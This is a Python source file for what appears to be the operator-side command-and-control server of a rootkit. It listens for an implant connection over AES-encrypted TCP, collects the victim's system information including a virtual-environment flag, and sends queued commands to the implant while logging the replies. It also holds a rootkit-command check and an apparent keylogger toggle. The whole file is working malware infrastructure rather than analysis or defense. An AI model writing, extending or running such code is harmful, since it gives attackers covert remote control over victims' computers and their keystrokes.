from utils.Crypto.CryptoHandler import CryptoHandler
from utils.TCP.AESNetworkHandler import AESNetworkHandler
from typing import Optional
import config as cfg
import socket
import threading
import queue
import errno
import json

class Request:
    def __init__(self, message: str, add_to_history: bool):
        self.message = message
        self.add_to_history = add_to_history
        self.response: Optional[str] = None
        self.event = threading.Event()

class TCPServer:
    def __init__(self, host: str = '0.0.0.0', port: int = 12345, crypto=None, owner=None):
        self._owner = owner
        self._host = host
        self._port = port
        self._crypto = crypto or CryptoHandler(cfg.AES_KEY, cfg.AES_IV)
        self._network_handler = AESNetworkHandler(self._crypto)

        self._server_socket: Optional[socket.socket] = None
        self._client_socket: Optional[socket.socket] = None
        self._client_ip: Optional[str] = None
        self._client_sysinfo: Optional[dict] = {}

        self._ip_lock = threading.Lock()
        self._running = False

        self._klg_on = False
        
        self._send_queue: queue.Queue[Request] = queue.Queue()
        self._recv_queue = queue.Queue()
        self._server_thread = None

    def start(self) -> None:
        self._running = True
        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.bind((self._host, self._port))
        self._server_socket.listen(1)

        print(f"[SERVER] Listening on {self._host}:{self._port}")
        self._server_thread = threading.Thread(target=self._accept_client_loop, daemon=True)
        self._server_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._server_socket:
            self._server_socket.close()
        with self._ip_lock:
            self._client_ip = None
            self._owner._authenticated = False
        print("[SERVER] Stopped cleanly.")

    def send_to_client(self, message: str) -> Optional[str]:
        req = Request(message, add_to_history=False)
        self._send_queue.put(req)
        req.event.wait(timeout=10)
        return req.response

    def send_to_client_with_history(self, message: str) -> Optional[str]:
        req = Request(message, add_to_history=True)
        self._send_queue.put(req)
        req.event.wait(timeout=10)
        return req.response

    def receive_from_client(self) -> Optional[str]:
        try:
            return self._recv_queue.get_nowait()
        except queue.Empty:
            return None

    def get_client_ip(self) -> Optional[str]:
        with self._ip_lock:
            return self._client_ip

    def get_listening_port(self) -> int:
        if self._server_socket:
            return self._server_socket.getsockname()[1]
        return 0

    def get_client_sysinfo(self) -> Optional[dict]:
        with self._ip_lock:
            return self._client_sysinfo if self._client_sysinfo else None

    def is_running(self) -> bool:
        return self._running

    def is_client_connected(self) -> bool:
        with self._ip_lock:
            return self._client_ip is not None

    def _is_socket_closed(self, sock: socket.socket) -> bool:
        try:
            sock.settimeout(0.5)
            try:
                data = sock.recv(1, socket.MSG_PEEK)
                if data == b'':
                    return True
            except socket.timeout:
                return False
        except socket.error as e:
            if e.errno in [errno.ECONNRESET, errno.EBADF, errno.ENOTCONN]:
                return True
            elif e.errno in [errno.EWOULDBLOCK, errno.EAGAIN]:
                return False
        return False

    def _accept_client_loop(self) -> None:
        while self._running:
            try:
                print("[SERVER] Waiting for connection...")
                self._client_socket, client_addr = self._server_socket.accept()
                with self._ip_lock:
                    self._client_ip = client_addr[0]
                print(f"[CONNECTED] Client IP: {self._client_ip}")

                # When connected, client send its sysinfo
                get_sysinfo = self._network_handler.receive(self._client_socket)
                parsed_sysinfo = json.loads(get_sysinfo)
                self._client_sysinfo = parsed_sysinfo
                # search for key "virtual_env" and transform it to a boolean
                if "virtual_env" in self._client_sysinfo:
                    self._client_sysinfo["virtual_env"] = bool(self._client_sysinfo["virtual_env"])

                print(f"[SYSINFO] Client sysinfo: {self._client_sysinfo}")

                self._handle_client()

                self._cleanup_after_disconnect()
            except Exception as e:
                print(f"[MAIN LOOP ERROR] {e}")

    def _handle_client(self) -> None:
        request = None
        try:
            while self._running:
                # Log: Checking if the socket is still connected
                print("[DEBUG] Checking socket connection status.")
                if self._client_socket is None or self._is_socket_closed(self._client_socket):
                    print("[SOCKET] Client disconnected.")
                    break

                # Log: Attempting to retrieve a request from the queue
                print("[DEBUG] Attempting to retrieve a request from the send queue.")
                try:
                    request: Request = self._send_queue.get(timeout=1)
                except queue.Empty:
                    print("[DEBUG] Send queue is empty, continuing.")
                    continue

                if request is None:
                    print("[WARN] Received None request, skipping.")
                    continue

                # --- Sending the command ---
                print(f"[DEBUG] Sending command: {request.message}")
                success = self._network_handler.send(self._client_socket, request.message)
                if not success:
                    tcp_error = "[ERROR] Failed to send command."
                    print(tcp_error)
                    if request.add_to_history:
                        self._owner._update_command_history(request.message, "", tcp_error=tcp_error)
                    request.event.set()
                    continue

                print(f"[SENT] {request.message}")

                # --- Receiving the response ---
                print("[DEBUG] Waiting for response from client.")
                response = self._network_handler.receive(self._client_socket)
                if response is False:
                    tcp_error = "[ERROR] Failed to receive response."
                    print(tcp_error)
                    if request.add_to_history:
                        self._owner._update_command_history(request.message, "", tcp_error=tcp_error)
                    request.event.set()
                    continue

                print(f"[RECEIVED] {response}")

                # --- Post-processing ---
                print("[DEBUG] Processing received response.")
                self._recv_queue.put(response)
                self._owner._check_rootkit_command(response)

                if request.add_to_history:
                    print("[DEBUG] Updating command history.")
                    self._owner._update_command_history(request.message, response)

                request.response = response
                request.event.set()

        except socket.timeout:
            tcp_error = "[SOCKET TIMEOUT] No data received in the last 2 seconds."
            print(tcp_error)
            if request and request.add_to_history:
                self._owner._update_command_history(request.message if request else "", "", tcp_error=tcp_error)

        except Exception as e:
            tcp_error = f"[EXCEPTION] An error occurred: {e}"
            print(tcp_error)
            if request and request.add_to_history:
                self._owner._update_command_history(request.message if request else "", "", tcp_error=tcp_error)


    def _cleanup_after_disconnect(self) -> None:
        print("[SERVER] Client disconnected.")
        with self._ip_lock:
            self._client_ip = None
        self._client_socket = None
        self._owner._authenticated = False
        self._command_history = []
        self._owner.reset_command_history()

        if self._client_socket:
            try:
                self._client_socket.shutdown(socket.SHUT_RDWR)
                self._client_socket.close()
            except Exception as e:
                print(f"[ERROR] Failed to close client socket: {e}")
        self._client_socket = None